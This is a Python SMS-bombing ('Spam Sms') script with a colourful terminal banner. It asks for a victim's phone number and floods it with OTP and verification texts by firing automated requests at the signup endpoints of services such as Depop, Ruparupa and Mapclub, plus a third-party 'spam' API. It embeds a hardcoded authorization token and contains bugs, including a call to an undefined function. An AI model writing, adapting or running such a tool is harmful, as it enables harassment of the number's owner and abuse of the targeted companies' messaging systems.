import os,sys,time,re,requests,json
from requests import post
from time import sleep
def alodoc():
    req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":no}).text
def alodoc2():
    req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":no}).text
def alodoc3():
    req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":no}).text
def depop():
    ua={
    "Host": "webapi.depop.com",
    "accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    dat=json.dumps({"phone_number":no,"country_code":"ID"})
    r = requests.put("https://webapi.depop.com/api/auth/v1/verify/phone", data=dat, headers=ua)
def depop2():
    ua={
    "Host": "webapi.depop.com",
    "accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    dat=json.dumps({"phone_number":no,"country_code":"ID"})
    r = requests.put("https://webapi.depop.com/api/auth/v1/verify/phone", data=dat, headers=ua)
def rupa():
     ua={
     "Host": "wapi.ruparupa.com",
     "Connection": "keep-alive",
     "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
     "Accept": "application/json",
     "Content-Type": "application/json",
     "X-Company-Name": "odi",
     "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
     "user-platform": "mobile",
     "X-Frontend-Type": "mobile",
     "Origin": "https://m.ruparupa.com",
     "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
     "Accept-Encoding": "gzip, deflate, br",
     "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
     }
     dat=json.dumps({"phone":no,"action":"register","channel":"chat","email":"","customer_id":"0","is_resend":0})
     r = requests.post("https://wapi.ruparupa.com/auth/generate-otp", data=dat, headers=ua).text
def mapclub():
    ua={
    "Host": "cmsapi.mapclub.com",
    "Connection": "keep-alive",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "content-type": "application/json",
    "Origin": "https://www.mapclub.com",
    "Referer": "https://www.mapclub.com/en/user/signup",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=ua).text
def intro(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def intro2(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def intro3(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def intro4(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
os.system('clear')
intro("""\033[1;96m╔╗ \033[1;37m┬─┐┬ ┬┌┬┐┌─┐┬    \033[1;96m╔═╗\033[1;37m╔╦╗╔═╗  
\033[1;96m╠╩╗\033[1;37m├┬┘│ │ │ ├─┤│    \033[1;96m╚═╗\033[1;37m║║║╚═╗   
\033[1;96m╚═╝\033[1;37m┴└─└─┘ ┴ ┴ ┴┴─┘  \033[1;96m╚═╝\033[1;37m╩ ╩╚═╝\033[1;33mV4""")
intro2("""\033[1;96m═══════════════════════════════════
\033[1;37m{\033[1;33m•\033[1;37m} \033[1;33mAuthor  :  \033[1;96mB4N9C4N
\033[1;37m{\033[1;33m•\033[1;37m} \033[1;33mYoutube :  \033[1;96mCANDRA - NM
\033[1;37m{\033[1;33m•\033[1;37m} \033[1;33mGithub  :  \033[1;96mgithub.com/B4N9C4N
\033[1;96m═══════════════════════════════════""")
time.sleep(1)
intro3("""\033[1;37m{\033[1;33m01\033[1;37m} > \033[1;33mSpam Sms Alodoc
\033[1;37m{\033[1;33m02\033[1;37m} > \033[1;33mSpam Sms Depop
\033[1;37m{\033[1;33m03\033[1;37m} > \033[1;33mSpam Sms Marco
\033[1;37m{\033[1;33m00\033[1;37m} > \033[1;33mExit
\033[1;96m═══════════════════════════════════""")
nomor = input("\033[1;37m{\033[1;33m•\033[1;37m} >\033[1;33m Choice : \033[1;96m")
if nomor == "01":
     no = input("\033[1;37m{\033[1;33m•\033[1;37m} >\033[1;33m number : \033[1;96m")
     print("\033[1;96m═══════════════════════════════════")
     alodoc()
     alodoc2()
     alodoc
     time.sleep(6)
     print("\033[1;37m{\033[1;33m•\033[1;37m} >\033[1;33m Succes mengirim pesan")
     sys.exit()
if nomor == "02":
     no = input("\033[1;37m{\033[1;33m•\033[1;37m} >\033[1;33m number : \033[1;96m")
     print("\033[1;96m═══════════════════════════════════")
     depop()
     depop2()
     rupa()
     time.sleep(6)
     print("\033[1;37m{\033[1;33m•\033[1;37m} >\033[1;33m Succes mengirim pesan")
     sys.exit()
if nomor == "03":
     no = input("\033[1;37m{\033[1;33m•\033[1;37m} >\033[1;33m number : \033[1;96m")
     print("\033[1;96m═══════════════════════════════════")
     mapclup()
     time.sleep(6)
     print("\033[1;37m{\033[1;33m•\033[1;37m} >\033[1;33m Succes mengirim pesan")
     sys.exit()
else:
      sys.exit()
if nomor == "00":
       print("\033[1;37m{\033[1;33m•\033[1;37m} \033[1;33mExit")
       sys.exit()
else:
      sys.exit()
intro()
intro2()
intro3()
